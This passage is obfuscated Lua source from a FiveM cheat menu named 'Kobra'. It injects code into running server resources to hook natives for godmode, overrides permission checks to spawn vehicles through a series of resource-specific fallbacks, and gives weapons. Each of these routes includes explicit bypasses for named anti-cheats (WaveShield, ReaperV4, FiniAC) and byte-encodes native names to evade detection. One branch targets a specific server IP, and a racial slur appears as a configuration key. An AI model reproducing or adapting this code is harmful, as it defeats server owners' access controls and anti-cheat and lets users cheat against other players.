    ]],v221));break;end if (v220==(2 -1)) then MachoHookNative(2596915000000000000 -0 ,function(v686) return true,v686;end);MachoHookNative(15321135000000000000,function(v687,v688,v689,v690,v691,v692,v693) return true,v687,v688,v689,v690,v691,v692,v693;end);v220=2 + 0 ;end end end;v12.HandleGodmodeToggle=function(v222,v223) local v224=GetResourceState("WaveShield")=="started" ;local v225=((GetResourceState("monitor")=="started") and "monitor") or (v224 and "WaveShield") or "any" ;if v224 then if v223 then local v694=0 + 0 ;while true do if (v694==(0 -0)) then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",14327 -11327 );v48(v225,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else local v695=0 -0 ;while true do if (v695==(0 + 0)) then v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",5905 -2905 );v48(v225,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end end return;end if v223 then v12:Notify("success","Kobra","Godmode Enabled",147 + 2853 );MachoInjectResource2(8 -5 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);else local v525=0;while true do if (v525==(17 -(12 + 5))) then v12:Notify("error","Kobra","Godmode Disabled",3000);MachoInjectResource2(11 -8 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);break;end end end end;v12.SpawnSelectedVehicle=function(v226,v227,v228,v229) if ( not v227 or (v227=="")) then return;end local v230=PlayerPedId();local v231=GetVehiclePedIsIn(v230,false);local v232=GetCurrentServerEndpoint();local v233=GetEntityCoords(v230);local v234=GetEntityHeading(v230);if (GetResourceState("solos-rentals")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",6400 -3400 );print("Creating Vehicle via Fallback #1");v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v227,tostring(v229),tostring(v228),v233.x,v233.y,v233.z,v234));elseif (GetResourceState("amigo")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",6377 -3377 );print("Creating Vehicle via Fallback #2");v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v227,tostring(v229),tostring(v228)));elseif v75 then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",3000);print("Creating Vehicle via Fallback #3");v48(v75,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v227,tostring(v229),tostring(v228)));elseif (GetResourceState("qb-core")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",7439 -4439 );print("Creating Vehicle via Fallback #4");v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v227   .. [["

            if ]]   .. tostring(v229)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v228)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v233.x   .. [[, ]]   .. v233.y   .. [[, ]]   .. v233.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v234   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );elseif ((v232:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1027=0;while true do if (v1027==(1 + 0)) then v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v227,tostring(v229),tostring(v228)));break;end if (v1027==(1973 -(1656 + 317))) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",2674 + 326 );print("Creating Vehicle via Fallback #5");v1027=1;end end elseif (GetResourceState("lunar_bridge")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",2405 + 595 );print("Creating Vehicle via Fallback #6");v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v227,tostring(v229),tostring(v228)));elseif (GetResourceState("lation_laundering")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",7977 -4977 );print("Creating Vehicle via Fallback #7");v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v227,tostring(v228),tostring(v229)));else local v1284=0 -0 ;local v1285;while true do if ((354 -(5 + 349))==v1284) then v1285=v74();if v1285 then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",14249 -11249 );print("Creating Vehicle via Fallback #8");v48(v1285,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v227,tostring(v229),tostring(v228)));elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",4271 -(266 + 1005) );if ( not v227 or (v227=="")) then return;end local function v1592(v1605) local v1606=0 + 0 ;local v1607;while true do if (v1606==(3 -2)) then return "{"   .. table.concat(v1607,",")   .. "}" ;end if (v1606==0) then v1607={};for v1647=1 -0 , #v1605 do v1607[v1647]=string.byte(v1605,v1647);end v1606=1697 -(561 + 1135) ;end end end local v1593=v1592(v227);local v1594=tostring(v229);local v1595=tostring(v228);local v1596=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1593,v1594,v1595);local v1597,v1598=pcall(MachoInjectResourceRaw,"monitor",v1596);if  not v1597 then end return;end v1284=1 -0 ;end if (v1284==(3 -2)) then if (GetResourceState("lb-phone")=="started") then local v1522=1066 -(507 + 559) ;local v1523;local v1524;while true do if (v1522==1) then v1523,v1524=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v229),v227,tostring(v228),v233.x,v233.y,v233.z,v234));end);if  not v1523 then end break;end if (v1522==(0 -0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",3000);print("Creating Vehicle via Fallback #10");v1522=3 -2 ;end end elseif (GetResourceState("qb-core")=="started") then local v1599=388 -(212 + 176) ;while true do if (1==v1599) then v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v229),GetHashKey(v227),tostring(v228)));break;end if (v1599==(905 -(250 + 655))) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",3000);print("Creating Vehicle via Fallback #11");v1599=2 -1 ;end end else return;end break;end end end end;local function v81() local v235={"WaveShield","FiniAC"};for v333,v334 in ipairs(v235) do if (GetResourceState(v334)=="started") then return false;end end return GetResourceState("ReaperV4")=="started" ;end local function v82() local v236=0 -0 ;local v237;while true do if (v236==0) then v237={"ReaperV4","WaveShield"};for v696,v697 in ipairs(v237) do if (GetResourceState(v697)=="started") then return false;end end v236=1;end if (v236==(3 -2)) then return GetResourceState("FiniAC")=="started" ;end end end v12.SpawnSelectedWeapon=function(v238,v239) local v240=1901 -(484 + 1417) ;local v241;local v242;local v243;local v244;local v245;while true do if (v240==(2 -1)) then function v241(v698) local v699=0;local v700;while true do if (v699==(1 -0)) then return table.concat(v700,",");end if (v699==(773 -(48 + 725))) then v700={};for v923=1, #v698 do v700[v923]=string.byte(v698,v923);end v699=1 -0 ;end end end v242=v241(v239);v240=2;end if ((7 -4)==v240) then v244=GetHashKey(v239);if (v244==(0 + 0)) then return;end v240=4;end if ((0 -0)==v240) then if ( not v239 or (v239=="")) then return;end v241=nil;v240=1 + 0 ;end if (v240==(2 + 2)) then v245=GetResourceState("WaveShield")=="started" ;if v245 then local v767=853 -(152 + 701) ;while true do if (v767==(1311 -(430 + 881))) then v238:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",1149 + 1851 );v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v243,v242));break;end end elseif (GetResourceState("ReaperV4")=="started") then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v238:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",3000);GiveWeaponToPed(v243,v244,10894 -(557 + 338) ,false,true);SetCurrentPedWeapon(v243,v244,true);Wait(74 + 176 );MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v244   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );elseif (GetResourceState("FiniAC")=="started") then local v959=0 -0 ;while true do if (v959==0) then v238:Notify("info","Kobra","Spawned Weapon Bypass #1",3000);MachoResourceStop("ox_inventory");v959=1;end if (v959==(3 -2)) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v242));break;end end else v238:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v242));end break;end if (v240==(4 -2)) then v243=PlayerPedId();if ( not v243 or (v243<=(0 -0))) then return;end v240=804 -(499 + 302) ;end end end;v12.GiveAllWeapons=function(v246) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
